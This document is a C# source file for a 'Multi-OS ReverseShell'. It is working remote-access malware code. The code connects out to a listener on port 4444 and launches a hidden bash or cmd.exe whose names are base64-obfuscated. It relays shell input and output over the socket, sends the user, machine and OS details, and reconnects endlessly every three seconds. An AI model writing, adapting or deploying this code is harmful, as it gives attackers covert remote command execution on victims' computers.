using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace Multi_OS_ReverseShell
{
    public class Server
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        public bool IsLinux
        {
            get
            {
                int p = (int)Environment.OSVersion.Platform;
                return (p == 4) || (p == 6) || (p == 128);
            }
        }

        public void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("127.0.0.1", 4444);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception error) { return; }

                processCmd = new Process();
                if (IsLinux)
                {
                    //processCmd.StartInfo.FileName = "/bin/bash";
                    processCmd.StartInfo.FileName = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("L2Jpbi9iYXNo"));
                }
                else
                {
                    //processCmd.StartInfo.FileName = "cmd.exe";
                    processCmd.StartInfo.FileName = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("Y21kLmV4ZQ=="));
                }
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
                processCmd.BeginErrorReadLine();
            }
            streamWriter.WriteLine("\n--[ Multi-OS ReverseShell ]---------------\n");
            streamWriter.WriteLine(" USER\t" + System.Environment.UserName + "\n LOCAL\t" + System.Environment.MachineName + "\n OS\t" + System.Environment.OSVersion);
            streamWriter.WriteLine("\n------------------------------------------\n");
            streamWriter.Flush();

            processCmd.StandardInput.WriteLine(" ");

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    //strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception error)
                {
                    Cleanup();
                    break;
                }
            }

        }

        public void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception error) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        public void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        public void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception error) { }

            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            Server Actual = new Server();
            for (;;)
            {
                Actual.RunServer();
                System.Threading.Thread.Sleep(3000);
            }
        }
    }
}
